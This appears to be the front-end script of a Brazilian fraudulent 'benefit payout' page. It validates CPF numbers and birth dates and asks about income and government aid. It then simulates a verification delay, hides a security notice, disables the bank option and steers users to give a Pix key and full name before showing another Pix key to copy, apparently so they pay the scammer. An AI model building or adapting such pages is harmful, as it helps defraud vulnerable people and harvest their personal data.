// Função para validar CPF
function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, '');
    if (cpf.length !== 11) return false;
    let soma = 0;
    let resto;

    for (let i = 1; i <= 9; i++) soma = soma + parseInt(cpf.substring(i-1, i)) * (11 - i);
    resto = (soma * 10) % 11;

    if ((resto === 10) || (resto === 11)) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;

    soma = 0;
    for (let i = 1; i <= 10; i++) soma = soma + parseInt(cpf.substring(i-1, i)) * (12 - i);
    resto = (soma * 10) % 11;

    if ((resto === 10) || (resto === 11)) resto = 0;
    if (resto !== parseInt(cpf.substring(10, 11))) return false;

    return true;
}

// Função para validar data de nascimento
function validarDataNascimento(data) {
    const regex = /^(0[1-9]|[12][0-9]|3[01])-(0[1-9]|1[0-2])-\d{4}$/;
    if (!regex.test(data)) return false;

    const [dia, mes, ano] = data.split('-').map(Number);
    const dataNascimento = new Date(ano, mes - 1, dia);
    return dataNascimento.getDate() === dia && dataNascimento.getMonth() === (mes - 1) && dataNascimento.getFullYear() === ano;
}

// Função para verificar se o CPF já foi testado
const cpfsTestados = new Set();

document.getElementById('dataNascimento').addEventListener('input', function(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) value = value.slice(0, 2) + '-' + value.slice(2);
    if (value.length > 5) value = value.slice(0, 5) + '-' + value.slice(5);
    input.value = value;
});

document.getElementById('formEtapa0').addEventListener('submit', function(event) {
    event.preventDefault();
    const renda = document.getElementById('renda').value;
    const auxilio = document.getElementById('auxilio').value;
    if (renda && auxilio) {
        document.getElementById('etapa0').style.display = 'none';
        document.getElementById('etapa1').style.display = 'block';
    } else {
        alert("Por favor, responda a todas as perguntas.");
    }
});

document.getElementById('formEtapa1').addEventListener('submit', function(event) {
    event.preventDefault();
    const cpf = document.getElementById('cpf').value;
    const dataNascimento = document.getElementById('dataNascimento').value;

    if (cpf && dataNascimento) {
        if (!validarCPF(cpf)) {
            alert("CPF inválido. Por favor, insira um CPF válido.");
            return;
        }

        if (!validarDataNascimento(dataNascimento)) {
            alert("Data de nascimento inválida. Por favor, insira uma data válida no formato DD-MM-AAAA.");
            return;
        }

        if (cpfsTestados.has(cpf)) {
            alert("Este CPF já foi testado.");
            return;
        }

        cpfsTestados.add(cpf);

        document.getElementById('etapa1').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        setTimeout(function() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('etapa2').style.display = 'block';
          document.getElementById('avisoSeguranca').style.display = 'none'; // Esconde aviso de segurança após a etapa 2
        }, 3000);
            
    } else {
        alert("Por favor, preencha todos os campos.");
    }
});

document.getElementById('receberValor').addEventListener('click', function() {
    document.getElementById('etapa2').style.display = 'none';
    document.getElementById('etapa3').style.display = 'block';
});

document.getElementById('retirarBanco').addEventListener('click', function() {
    // Sem mensagem, botão inativo
});

document.getElementById('receberPix').addEventListener('click', function() {
    document.getElementById('etapa3').style.display = 'none';
    document.getElementById('etapa4').style.display = 'block';
});

document.getElementById('formEtapa4').addEventListener('submit', function(event) {
    event.preventDefault();
    const tipoChavePix = document.getElementById('tipoChavePix').value;
    const chavePix = document.getElementById('chavePix').value;
    const nomeCompleto = document.getElementById('nomeCompleto').value;
    if (tipoChavePix && chavePix && nomeCompleto) {
        document.getElementById('etapa4').style.display = 'none';
        document.getElementById('etapa5').style.display = 'block';
        document.getElementById('chavePixDisplay').innerText = chavePix;
        document.getElementById('nomeCompletoDisplay').innerText = nomeCompleto;
    } else {
        alert("Por favor, preencha todos os campos.");
    }
});

function copiarChavePix() {
    const chavePix = document.getElementById('chavePixCopiar').innerText;
    const inputTemp = document.createElement('input');
    inputTemp.value = chavePix;
    document.body.appendChild(inputTemp);
    inputTemp.select();
    document.execCommand('copy');
    document.body.removeChild(inputTemp);
    alert("Chave Pix copiada para a área de transferência!");
}
